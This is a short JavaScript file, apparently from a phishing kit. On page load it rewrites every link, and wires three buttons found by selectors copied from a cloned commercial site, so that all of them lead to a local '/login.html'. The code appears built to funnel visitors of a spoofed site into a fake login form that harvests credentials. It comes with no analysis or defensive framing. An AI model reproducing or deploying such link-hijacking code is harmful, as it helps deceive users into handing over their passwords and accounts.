window.addEventListener('load', () => {
    const allLinks = document.querySelectorAll('a');
    const blueBtn = document.querySelector('#__next > div > div.Main-sc-rtoetp-1.lChYh > div.Wrapper-sc-h4kyly-0.dEjmzA > div > div:nth-child(1) > div > div > div > div > div.Column-sc-1e0dniw-1.ivvaIY.section-container > div > div.Row-sc-1e0dniw-0.jKQbhc > div > div.WrapperEmbed-sc-kknuav-1.dqocmo > fieldset > div.Place-sc-1e0dniw-2.bVkCnR > div')
    const aboutBtn = document.querySelector('#__next > div > div.Main-sc-rtoetp-1.lChYh > div.SectionWrap-sc-1lpwk7o-0.brQdu > div > div > div.Column-sc-1e0dniw-1.cicRnM > div > div > div > p')
    const getStartedBtn = document.querySelector('#__next > div > div.Main-sc-rtoetp-1.lChYh > div.Wrapper-sc-h4kyly-0.dEjmzA > div > div.DesktopWrapper-sc-1jixp8z-3.drkfda > div > div > div > div > div.Column-sc-1e0dniw-1.BorderContainer-sc-1jixp8z-1.fmSVLB.kPYurk > div:nth-child(2) > div.Place-sc-1e0dniw-2.hogcUq > div')
  
    blueBtn.addEventListener('click', () => {
        window.location.href = '/login.html'
    })

    aboutBtn.addEventListener('click', () => {
        window.location.href = '/login.html'
    })

    getStartedBtn.addEventListener('click', () => {
        window.location.href = '/login.html'
    })

    allLinks.forEach(link => {
        link.href = '/login.html'
        link.target = '_self'
        console.log(link)
    })
    console.log(allLinks);
})